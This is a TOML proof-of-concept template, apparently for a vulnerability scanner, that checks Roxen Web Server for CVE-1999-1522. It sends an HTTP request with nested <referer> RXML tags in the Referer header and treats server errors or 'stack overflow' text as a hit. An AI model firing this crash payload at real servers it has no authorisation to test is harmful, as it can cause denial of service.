[info]
author = "ave"
description = "Roxen Web Server 1.3.11 及更早版本 htmlparse.pike 递归解析拒绝服务漏洞验证，通过发送包含深层嵌套 RXML referer 标签的 HTTP 请求触发服务异常"
id = "POC-AVE-1999-1158"
name = "CVE-1999-1522 PoC"
severity = "medium"
tags = ["ave-1999-1158"]
vuln_id = [
    "CVE-1999-1522",
    "AVE-1999-1158",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Referer = "<referer><referer><referer><referer><referer><referer><referer><referer><referer><referer>"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "error",
    "stack overflow",
    "internal error",
]
